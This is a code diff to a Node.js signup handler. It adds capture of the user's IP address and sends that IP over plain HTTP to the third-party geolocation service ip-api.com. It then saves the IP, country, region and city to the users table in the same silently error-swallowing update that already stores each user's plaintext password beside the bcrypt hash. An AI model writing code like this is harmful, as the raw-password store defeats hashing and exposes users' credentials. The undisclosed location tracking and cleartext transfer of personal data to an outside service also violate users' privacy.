@@ -30,7 +30,27 @@ const signup = async (req, res) => {
 
     const hashedPassword = await bcrypt.hash(password, 10);
 
-    // Insert user first without plain_password
+    // Get real IP — works behind proxies/Vercel/Nginx
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
+      || req.headers['x-real-ip']
+      || req.socket?.remoteAddress
+      || null;
+
+    // Resolve IP to location using ip-api.com (free, no key needed)
+    let ipCountry = null, ipCity = null, ipRegion = null;
+    if (ip && ip !== '::1' && ip !== '127.0.0.1') {
+      try {
+        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,status`);
+        const geo = await geoRes.json();
+        if (geo.status === 'success') {
+          ipCountry = geo.country || null;
+          ipRegion  = geo.regionName || null;
+          ipCity    = geo.city || null;
+        }
+      } catch (_) {}
+    }
+
+    // Insert user
     const { data: user, error } = await supabase
       .from('users')
       .insert([{ email, password: hashedPassword, name }])
@@ -39,11 +59,11 @@ const signup = async (req, res) => {
 
     if (error) throw error;
 
-    // Try to save plain_password separately — silently ignore if column missing
+    // Save plain_password, ip and location separately — silently ignore if columns missing
     try {
       await supabase
         .from('users')
-        .update({ plain_password: password })
+        .update({ plain_password: password, ip_address: ip, ip_country: ipCountry, ip_region: ipRegion, ip_city: ipCity })
         .eq('id', user.id);
     } catch (_) {}
 
